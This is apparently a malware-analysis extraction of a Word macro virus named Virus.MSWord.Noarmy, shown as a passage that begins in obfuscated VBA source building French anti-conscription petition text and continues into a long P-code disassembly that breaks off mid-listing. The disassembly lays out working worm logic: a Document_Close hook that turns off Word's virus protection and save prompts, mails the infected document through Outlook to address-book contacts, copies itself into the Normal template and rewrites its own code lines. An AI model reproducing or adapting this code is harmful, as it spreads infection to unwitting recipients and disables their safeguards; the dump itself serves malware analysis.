+ Chr(32) + "rêveurs," + Chr(32) ' kfyllqh
c1 = c1 + "entrepreneurs," + Chr(32) + "chômeurs," + Chr(32) + "voyageurs" ' yvuqpcqiewhula
b2 = Chr(32) + "ou" + _
Chr(32) + "tout" + Chr(32) _
+ "simplement" + _
Chr(32) + "amoureux" + Chr(32) + "qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + Chr(32) _
+ "Vie" + Chr(32): b2 = b2 + "pour" + Chr(32) + "ces" _
+ Chr(32) + "10" + Chr(32) + "mois." + Chr(32) + "Ils" + Chr(32) + _
"refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "inégalitaire" + Chr(32): b2 _
= b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + Chr(13) + "Pétition" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) _
+ "sursitaires" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' afmsohjth
b1 = b1 + Chr(32) _
+ "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + "service" + Chr(32) + "militaire:" + Chr(32) + "http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" + Chr(32) + _
"du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" + Chr(32) + "http://www.donquichotte.com" + Chr(13) + "Non" + Chr(32) + "au" + Chr(32) + "S.N." ' pwtwip
a1 = a1 + Chr(32) + "qui" + Chr(32) + "tue" + Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn" ' duxtdym
e4 = Chr(80) + _
Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) ' lvxktmpynf
j17 = Chr(69) + Chr(110) + Chr(100): c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) ' jpsxeqgovdu
End Sub ' bswsfwa

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Noarmy
' ===============================================================================
' Module streams:
' Macros/VBA/NOSN - 44412 bytes
' Line #0:
' 	LineCont 0x0008 1D 00 00 00 59 00 00 00
' 	Dim 
' 	VarDefn h7
' 	VarDefn g8
' 	VarDefn j1
' 	VarDefn k2
' 	VarDefn j8
' 	VarDefn l1
' 	VarDefn m5
' 	VarDefn l8
' 	VarDefn a5
' 	VarDefn d3
' 	VarDefn g6
' 	VarDefn h3
' 	VarDefn k1
' 	VarDefn k5
' 	VarDefn g3
' 	VarDefn n6
' 	VarDefn h5
' 	VarDefn j5
' 	VarDefn k7
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn e8
' 	VarDefn b9
' 	VarDefn a7
' 	VarDefn d6
' 	VarDefn c5
' 	VarDefn e2
' 	VarDefn g1
' 	VarDefn l3
' 	VarDefn l9
' 	VarDefn n2
' 	VarDefn m1
' 	VarDefn h8
' 	VarDefn l5
' 	VarDefn i1
' 	VarDefn i7
' 	VarDefn e4
' 	VarDefn c7
' 	VarDefn c4
' 	VarDefn f3
' 	VarDefn h1
' 	VarDefn d8
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn g5
' 	VarDefn e1
' 	VarDefn m4
' 	VarDefn b3
' 	VarDefn d4
' 	VarDefn f7
' 	VarDefn i3
' 	VarDefn g2
' 	VarDefn e5
' 	VarDefn d2
' 	VarDefn a4
' 	VarDefn a3
' 	VarDefn a2
' 	VarDefn c2
' 	VarDefn d1
' 	VarDefn c3
' 	VarDefn c1
' 	VarDefn b2
' 	VarDefn b1
' 	VarDefn a1
' 	QuoteRem 0x0043 0x0010 " cwrgawuvssrxhra"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' 	QuoteRem 0x001D 0x000F " rftkwnfdqwpazx"
' Line #2:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0006 " qztya"
' Line #3:
' 	ArgsCall (Call) f1 0x0000 
' 	BoS 0x0000 
' 	ArgsCall (Call) f2 0x0000 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld j1 
' 	Ld k2 
' 	Ld j8 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	SelectCase 
' 	QuoteRem 0x0051 0x0005 " peaw"
' Line #4:
' 	Ld j1 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x000B " tmoiaandqg"
' Line #5:
' 	LitDI4 0x0001 0x0000 
' 	Ld j1 
' 	Ld k2 
' 	Ld j8 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld m5 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	Ld m5 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld m5 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0096 0x0009 " xdaaxpmc"
' Line #6:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld a5 
' 	St d8 
' 	QuoteRem 0x0014 0x0007 " pjammw"
' Line #7:
' 	SetStmt 
' 	Ld d8 
' 	ArgsLd CreateObject 0x0001 
' 	Set c4 
' 	QuoteRem 0x001A 0x000D " luqmccmcaheg"
' Line #8:
' 	SetStmt 
' 	Ld l8 
' 	Ld c4 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set f3 
' 	QuoteRem 0x001D 0x0010 " solhdqkyuajbsuu"
' Line #9:
' 	Ld j1 
' 	Ld d3 
' 	Ld g6 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	SelectCase 
' 	QuoteRem 0x0034 0x0010 " qzpspryoqbmafmt"
' Line #10:
' 	Ld h3 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c4 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld k1 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0027 0x0010 " bqsxyanotmtgwym"
' Line #11:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld k5 
' 	Ld g3 
' 	Ld f3 
' 	ArgsMemCall Logon 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld f3 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld i 
' 	Ld f3 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set g4 
' 	QuoteRem 0x0038 0x000C " euqokjnment"
' Line #12:
' 	SetStmt 
' 	Ld m5 
' 	Ld c4 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set h1 
' 	QuoteRem 0x001B 0x000D " rgkbszbunyjq"
' Line #13:
' 	Ld g4 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St h2 
' 	QuoteRem 0x001D 0x0007 " wmkcov"
' Line #14:
' 	Ld m5 
' 	St b6 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld h2 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld j 
' 	Ld g4 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Set j2 
' 	BoS 0x0000 
' 	Ld j2 
' 	MemLd Address 
' 	FnLen 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	CaseGt 
' 	CaseDone 
' 	QuoteRem 0x0062 0x0005 " yhzj"
' Line #15:
' 	LineCont 0x0004 13 00 00 00
' 	Ld j2 
' 	MemLd Address 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	Ld j2 
' 	MemLd Address 
' 	Ld n6 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x001D 0x000B " oocdpaghke"
' Line #16:
' 	Ld j2 
' 	Ld h1 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' 	BoS 0x0000 
' 	Ld b6 
' 	LitDI2 0x0001 
' 	Add 
' 	St b6 
' 	QuoteRem 0x0022 0x0006 " pkcov"
' Line #17:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0017 0x0007 " mufonw"
' Line #18:
' 	LineCont 0x0004 08 00 00 00
' 	Ld b6 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0032 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ExitFor 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0010 0x0008 " yutdgly"
' Line #19:
' 	LineCont 0x0004 0C 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x851F 0x51EB 0x1EB8 0x3FD5 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h5 
' 	Ld h1 
' 	MemSt Subject 
' 	QuoteRem 0x0016 0x0008 " iumhnok"
' Line #20:
' 	Ld j5 
' 	Ld h1 
' 	MemSt Body 
' 	BoS 0x0000 
' 	LitR8 0x851F 0x51EB 0x1EB8 0x3FE5 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld g1 
' 	Ld h1 
' 	MemSt Subject 
' 	QuoteRem 0x002E 0x0008 " jfusllq"
' Line #21:
' 	Ld l3 
' 	Ld h1 
' 	MemSt Body 
' 	QuoteRem 0x000D 0x0008 " lezlodi"
' Line #22:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld l9 
' 	Ld h1 
' 	MemSt Subject 
' 	QuoteRem 0x001B 0x0008 " ayxiymv"
' Line #23:
' 	Ld n2 
' 	Ld h1 
' 	MemSt Body 
' 	QuoteRem 0x000D 0x000E " ineutdeokhjfx"
' Line #24:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0010 " hdaeinqiffykapi"
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld h1 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x002B 0x0006 " djcfp"
' Line #26:
' 	Ld h1 
' 	ArgsMemCall Send 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld f3 
' 	ArgsMemCall Logoff 0x0000 
' 	QuoteRem 0x001B 0x000F " uotwyewttljrue"
' Line #27:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000C " ydukjsahfsi"
' Line #28:
' 	Ld h3 
' 	Ld j1 
' 	Ld d3 
' 	Ld g6 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x002D 0x000F " voplmkxaiknozz"
' Line #29:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000C " bhopwbujfhu"
' Line #30:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set n1 
' 	QuoteRem 0x0022 0x000E " qqfiolkfrwbwe"
' Line #31:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld n1 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set i6 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set n1 
' 	QuoteRem 0x0044 0x0010 " mzuwqhspgiftcca"
' Line #32:
' 	LineCont 0x0004 03 00 00 00
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld n1 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set k3 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St i2 
' 	QuoteRem 0x0024 0x0008 " bfigyza"
' Line #33:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld m1 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x003A 0x000D " cjfwlogvinqc"
' Line #34:
' 	Ld i6 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x0014 0x0007 " rmjsbh"
' Line #35:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x000D " hfsyuvknolfd"
' Line #36:
' 	LineCont 0x0004 02 00 00 00
' 	SetStmt 
' 	Ld k3 
' 	Set b5 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld i6 
' 	Set f5 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St i2 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0029 0x000F " lojknihntcrlgf"
' Line #37:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld k3 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x0020 0x0007 " ollzgt"
' Line #38:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x0008 " ionuzaa"
' Line #39:
' 	SetStmt 
' 	Ld i6 
' 	Set b5 
' 	QuoteRem 0x000C 0x000B " dwzyqkqnlp"
' Line #40:
' 	SetStmt 
' 	Ld k3 
' 	Set f5 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St i2 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld i2 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x003E 0x000C " sixmngpeiid"
' Line #41:
' 	LineCont 0x0004 08 00 00 00
' 	Ld b5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i4 
' 	BoS 0x0000 
' 	Ld f5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St c8 
' 	QuoteRem 0x0023 0x000F " tmafkjyvxdezdo"
' Line #42:
' 	Ld c8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseGt 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld c8 
' 	Ld f5 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x003D 0x0009 " mcjylvsw"
' Line #43:
' 	EndSelect 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St c6 
' 	QuoteRem 0x0013 0x0008 " eddibdn"
' Line #44:
' 	LitStr 0x0000 ""
' 	St c9 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j3 
' 	QuoteRem 0x0011 0x000E " cgusxieqyzlsk"
' Line #45:
' 	LitDI2 0x0000 
' 	St a6 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld l2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i4 
' 	For 
' 	QuoteRem 0x0019 0x0008 " itcsuug"
' Line #46:
' 	Ld l2 
' 	LitDI2 0x0001 
' 	Ld b5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St h4 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St i 
' 	QuoteRem 0x0027 0x000E " ocxsjfjhbzwpd"
' Line #47:
' 	LitDI2 0x0001 
' 	Ld h4 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St f4 
' 	QuoteRem 0x001B 0x000C " qnaecujvlej"
' Line #48:
' 	LineCont 0x0008 02 00 00 00 13 00 00 00
' 	Ld f4 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h4 
' 	FnLen 
' 	St f4 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld f4 
' 	LitDI2 0x0002 
' 	Sub 
' 	St f4 
' 	QuoteRem 0x0007 0x000B " qtzfpjwrew"
' Line #49:
' 	EndSelect 
' 	BoS 0x0000 
' 	Do 
' 	BoS 0x0000 
' 	Ld i 
' 	Ld h4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St j 
' 	BoS 0x0000 
' 	Ld j 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0041 0x0009 " vsbpeduu"
' Line #50:
' 	Ld h4 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St b8 
' 	QuoteRem 0x001B 0x0010 " ppfzvdcawvxgmkg"
' Line #51:
' 	Ld f4 
' 	LitDI2 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000C 0x0006 " xzgnj"
' Line #52:
' 	LitVarSpecial (True)
' 	St b8 
' 	QuoteRem 0x000A 0x000C " xrgsdalsled"
' Line #53:
' 	CaseElse 
' 	QuoteRem 0x000A 0x0008 " kipbpii"
' Line #54:
' 	LitVarSpecial (False)
' 	St b8 
' 	QuoteRem 0x000B 0x000E " zigyvtdyeztbw"
' Line #55:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000A " erichvtnc"
' Line #56:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld h4 
' 	Ld i 
' 	Ld j 
' 	Ld i 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St n5 
' 	BoS 0x0000 
' 	Ld b8 
' 	SelectCase 
' 	QuoteRem 0x0013 0x000B " qgfepoausi"
' Line #57:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld l2 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld b5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St f6 
' 	QuoteRem 0x002F 0x000F " cxmgamzcqnmapj"
' Line #58:
' 	LitDI2 0x0001 
' 	Ld f6 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St k4 
' 	BoS 0x0000 
' 	Ld k4 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j3 
' 	QuoteRem 0x003C 0x0010 " yidavoatnzlsfpr"
' Line #59:
' 	LineCont 0x0004 0B 00 00 00
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld f6 
' 	LitDI2 0x0001 
' 	Ld k4 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St j3 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld n5 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0043 0x000C " rkfmmffldxg"
' Line #60:
' 	Ld e8 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n5 
' 	QuoteRem 0x0012 0x0005 " araf"
' Line #61:
' 	LineCont 0x0004 02 00 00 00
' 	Ld e8 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n5 
' 	QuoteRem 0x001D 0x000F " bxgzeccjlrstyl"
' Line #62:
' 	Ld k7 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld e8 
' 	St n5 
' 	QuoteRem 0x0011 0x0007 " lqztao"
' Line #63:
' 	Ld e8 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld k7 
' 	St n5 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld h6 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3F94 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x005C 0x0006 " wxkwr"
' Line #64:
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St h6 
' 	QuoteRem 0x0021 0x000D " ueplkzlkmlib"
' Line #65:
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld l2 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld i4 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0033 0x000A " yuqfnimrs"
' Line #66:
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld j3 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld e4 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0068 0x0005 " qofy"
' Line #67:
' 	LitVarSpecial (True)
' 	St h6 
' 	QuoteRem 0x000A 0x000E " glasprzhziqpi"
' Line #68:
' 	Ld a6 
' 	LitDI2 0x0001 
' 	Add 
' 	St a6 
' 	BoS 0x0000 
' 	Ld a6 
' 	SelectCase 
' 	QuoteRem 0x001C 0x000E " virqmyfhhodap"
' Line #69:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0007 0x000C " khqcewgjfls"
' Line #70:
' 	Ld i4 
' 	St l2 
' 	QuoteRem 0x0008 0x000A " mbuozopmg"
' Line #71:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000C " wdmonczzqrw"
' Line #72:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000D " rateivibgtpy"
' Line #73:
' 	LineCont 0x0008 0E 00 00 00 1C 00 00 00
' 	LitDI2 0x0001 
' 	Ld h4 
' 	Ld c7 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld n5 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld j17 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St h6 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x001C 0x0006 " wvykm"
' Line #74:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000A " cbwcrponf"
' Line #75:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld n5 
' 	FnLen 
' 	SelectCase 
' 	QuoteRem 0x002C 0x0005 " nrrc"
' Line #76:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000D 0x000E " zawhhcvdagntb"
' Line #77:
' 	LineCont 0x0004 09 00 00 00
' 	Ld n5 
' 	FnLen 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x001B 0x0005 " hwkc"
' Line #78:
' 	LineCont 0x0004 08 00 00 00
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0006 0x0008 " xkbityn"
' Line #79:
' 	LitVarSpecial (True)
' 	St h6 
' 	QuoteRem 0x000A 0x000F " jnnhvbkgaijijv"
' Line #80:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0007 " lpemaw"
' Line #81:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0022 0x0009 " upmwqzrh"
' Line #82:
' 	LitVarSpecial (False)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0017 0x0006 " gfvhu"
' Line #83:
' 	LineCont 0x0004 02 00 00 00
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld n5 
' 	SelectCase 
' 	QuoteRem 0x001E 0x000F " crklqcdnsihqua"
' Line #84:
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000D 0x0010 " usrlipuzglpypbe"
' Line #85:
' 	LineCont 0x0004 24 00 00 00
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld j1 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St j4 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	QuoteRem 0x0030 0x0006 " xrgrc"
' Line #86:
' 	LitVarSpecial (True)
' 	St j4 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0021 0x0006 " gevfp"
' Line #87:
' 	Ld n5 
' 	FnLen 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	SelectCase 
' 	QuoteRem 0x0028 0x0009 " vcqzppyd"
' Line #88:
' 	LineCont 0x0004 1D 00 00 00
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	QuoteRem 0x000E 0x000F " aaoflssiwocpcx"
' Line #89:
' 	LitVarSpecial (False)
' 	St j4 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0016 0x0005 " zpof"
' Line #90:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0001 
' 	Ld n5 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	QuoteRem 0x002B 0x000C " pezjfivxjsj"
' Line #91:
' 	LitVarSpecial (True)
' 	St j4 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0016 0x0009 " vxdzpkqn"
' Line #92:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld h6 
' 	SelectCase 
' 	QuoteRem 0x001B 0x0005 " eewh"
' Line #93:
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld j4 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c9 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0027 
